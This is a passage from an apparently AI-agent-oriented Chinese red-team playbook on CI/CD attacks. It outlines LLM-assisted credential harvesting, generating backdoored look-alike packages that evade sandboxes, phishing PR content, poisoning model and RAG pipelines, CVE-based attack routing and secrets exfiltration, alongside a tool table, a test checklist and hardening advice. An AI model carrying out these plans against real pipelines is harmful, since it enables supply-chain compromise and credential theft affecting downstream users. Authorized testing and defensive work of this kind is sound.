#    "对比 package.json 中依赖在公共源的注册情况，找出可抢注的内部包名"
#    "从这些构建日志中提取所有可能的敏感凭据，按类型分类"
# 3) 语义级发现: LLM 可理解"看似无害但可被污染的传递路径"
#   （如 CI 变量经脚本进入 docker build --build-arg）
```

### 11.2 AI 生成恶意依赖与 payload
```
# 1) 生成"高仿真"恶意包: 复制知名包结构/README/文档，隐藏后门
#     - 正常功能完整实现（提高合入概率）
#     - 后门只在内网域名/特定环境激活（规避沙箱）
# 2) 生成流水线注入 payload: 针对具体 CI 平台语法定制
# 3) 生成免杀/混淆的构建期后门（联动 intranet-penetration-testing 11.3）
# 4) 生成社工内容: 恶意 PR 描述/维护者冒充邮件/钓鱼 commit message
# 注意: 所有生成物仅在授权靶场验证
```

### 11.3 AI 驱动流水线漏洞扫描
```
# 用 LLM 作为"流水线审计引擎"批量分析仓库:
# 1) 批量拉取仓库 workflow/配置 → LLM 判定漏洞等级与利用条件
# 2) 汇总生成"可投毒面"清单（哪个仓库/哪个 job 最值得打）
# 3) 结合 CVE 情报: 让 LLM 核对目标平台版本 → 推荐可用 CVE 与 PoC
# 4) 输出攻击顺序建议（先打哪里损失最小收益最大）
```

### 11.4 AI 大模型平台的 CI/CD 攻击面
```
# 企业 LLM 应用的开发交付同样走 CI/CD，且更脆弱:
# 1) 模型/提示词在制品库: 篡改微调模型/提示词模板 → 所有下游 LLM 应用行为被控
# 2) LLM 应用流水线中的 API key/云凭据（推理服务调用）
# 3) RAG 知识库的构建管道: 投毒知识库内容 → 检索增强应用输出恶意结果
#    （联动 intranet-penetration-testing 12.2/12.4）
# 4) Agent 应用 CI: 测试/部署阶段注入恶意工具配置
# 红队价值: AI 平台的供应链投毒影响"所有对话用户"，且难被发现
```

### 11.5 AI 辅助自动化编排
```
# 用 LLM Agent 串联 CI/CD 攻击全流程（Eino/CyberStrikeAI 框架）:
#   侦察 agent: 枚举仓库/平台/版本 → 分析 agent: LLM 判定漏洞与注入点 →
#   执行 agent: 调用 nuclei/扫描器/exp → 凭据 agent: 提取归类 secrets
# 每步 LLM 决策留痕可回放，满足授权审计
# 高危动作（投毒/篡改制品）保留人工确认
```

## 十二、工具链

| 用途 | 工具 |
|------|------|
| 代码库信息收集 | git-dumper、trufflehog、gitleaks、gitdorker、git-secrets |
| Git 对象深度 | git fsck/reflog/stash、GitTools(Extractor/Finder)、gitrob |
| 平台指纹 | nuclei（devops 模板）、fofahub 平台识别 |
| CI 攻击 | jenkins-cli、CVE-2024-23897 PoC 脚本、CVE-2023-7028.py、Groovy 脚本集 |
| 供应链 | Confused（依赖混淆验证）、OSV-Scanner、npm-audit、pip-audit |
| 制品/镜像 | skopeo、dive、docker registry API、regclient、oras |
| GitOps/CD | kubectl、argocd CLI、ArgoCD API 枚举脚本 |
| 综合扫描 | nuclei（ci_cd/未授权模板）、ffuf 端点枚举 |
| AI 辅助 | 自研 LLM 审计提示词集、LLM Agent 编排（Eino） |

## 十三、CI/CD 攻击测试检查清单（高级版）

- [ ] 平台指纹与版本识别（Jenkins/GitLab/GitHub企业/ArgoCD/Nexus/Harbor/TeamCity）
- [ ] 版本对应 CVE 核对（见第十章速查表 + 官方公告）
- [ ] .git 目录泄露 / Git 历史/reflog/stash/dangling commit 挖掘
- [ ] 公开仓库与代码搜索（dorking）敏感信息
- [ ] Secret 批量扫描（trufflehog/gitleaks 全历史）
- [ ] GitLab: CVE-2023-7028 密码重置 / CI lint SSRF / CI_JOB_TOKEN 权限
- [ ] Jenkins: Script Console / CVE-2024-23897 文件读取 / 凭据库解密
- [ ] GitHub Actions: workflow 注入点审计 / GITHUB_TOKEN 滥用 / 自托管 Runner
- [ ] 流水线配置注入点（PR/issue/branch/tag/webhook 输入）
- [ ] 依赖混淆/typosquatting 候选收集与公共源验证
- [ ] 制品库匿名访问（Nexus/Artifactory/Harbor/Docker Registry）
- [ ] 镜像层内 secrets 提取（docker history/env/层审计）
- [ ] ArgoCD: settings 未认证 / OIDC audience / webhook DoS / CSRF
- [ ] CD 平台弱口令/默认凭据/API 未授权端点
- [ ] 云身份面: OIDC token / kubeconfig / imagePullSecret
- [ ] 开发者终端初始访问面评估（凭据/插件/会话）
- [ ] 供应链影响面评估（仓库→构建→制品→生产全链）

## 十四、修复建议（高级）

- **平台加固**：CI/CD 平台不暴露公网（或仅经 SSO+IP 白名单）、强制 MFA（2FA 可阻断 GitLab 7028 类）、及时打补丁（KEV 清单优先）
- **最小权限**：GITHUB_TOKEN/CI_JOB_TOKEN 最小化（contents:read 而非 write）、secrets 仅注入需要的 job、Runner 隔离（专用 Runner + 命名空间隔离）
- **流水线硬化**：所有可控输入加引号/白名单、禁止不可信输入进表达式、action 固定 commit SHA、禁止 pull_request_target 处理不可信代码
- **依赖安全**：锁定版本+lock 文件、私有源优先（杜绝依赖混淆）、内部包名注册公共源占位、启用签名验证（cosign/sigstore/npm provenance）
- **制品安全**：镜像/制品不可变 tag + 摘要校验、Registry 强认证、镜像层扫描（含历史层 secrets）
- **CD/GitOps**：ArgoCD 等强制 SSO/audience 校验、仓库写权限分级、部署审批不可绕过、webhook 请求体大小限制
- **凭据治理**：云 AK 用短期凭据（OIDC/角色）、密钥轮换、构建环境不落盘长期凭据
- **开发者端**：开发者机器纳入 EDR、Git 凭据用硬件/系统级保护、IDE 扩展来源审计、MFA 全覆盖
- **供应链监控**：上游 action/依赖变更告警（Dependabot/OSV）、制品 provenance 验证、发布前供应链审计
- **检测告警**：监控异常构建（新任务/新 Runner/新依赖）、Secrets 泄露检测（GitHub secret scanning）、ArgoCD/CI 平台异常 API 调用

## 注意事项

- **仅限授权测试**：CI/CD 平台为生产关键设施，投毒/篡改可能造成大范围影响，必须在书面授权与明确边界内测试
- **供应链操作风险**：依赖混淆、镜像投毒、Action 篡改等操作的"受害者"是真实用户/下游系统，测试用一次性隔离环境并立即回滚
- **凭据敏感**：构建平台中的云 AK/数据库口令等高危凭据不得外泄、不得入库报告
- **平台可用性**：避免 DoS 类操作（如 ArgoCD webhook 大包）干扰生产
- **AI 生成物合规**：AI 辅助生成的恶意包/payload 仅在授权靶场验证，禁止投放真实供应链
- **合规要求**：遵守《网络安全法》《数据安全法》《个人信息保护法》及开源软件许可与平台 ToS，仅在授权范围内测试

## DECISION TREE

```
CI/CD 攻击入口定位（先确认授权边界——CI 污染影响生产制品）？
├── 代码托管可达（公开仓库/泄露 token/暴露 .git）→ 仓库侦察 → workflow/pipeline 配置审计
├── workflow 注入面（PR title/branch 名进 bash）→ GitHub Actions 注入 → secrets 外带
├── 自托管 CI（Jenkins/GitLab CI）→ 按版本 CVE 路由（23897 控制台/7028 注册接管）
├── 依赖供应链 → 依赖混淆/typosquatting（联动 dependency-confusion 细分包）
├── 制品库/镜像仓库可达 → 镜像投毒/tag 覆写（第五章）
├── GitOps（ArgoCD/FluxCD）→ 第六章 CVE 路由（CVE-2024-37152 等）
├── 开发者终端 → 第八章投递面（联动 initial-access-phishing）
└── 全部不可达 → 记录攻击面缺口，按信息不足报告
```

## TARGET TOOL ADAPTATION

Use visible `http-framework-test` for baseline/probe comparison and `execute-python-script` for workflow 配置解析与 payload 构造。投毒类验证只做无害标记（如构建日志写入标记串），不投放真实恶意制品。

## RELATED ROUTING

- [insecure-source-code-management](../insecure-source-code-management/SKILL.md) — .git 泄露与代码托管攻击面细分
- [dependency-confusion](../dependency-confusion/SKILL.md) — 依赖混淆是 CI/CD 供应链的核心攻击面之一
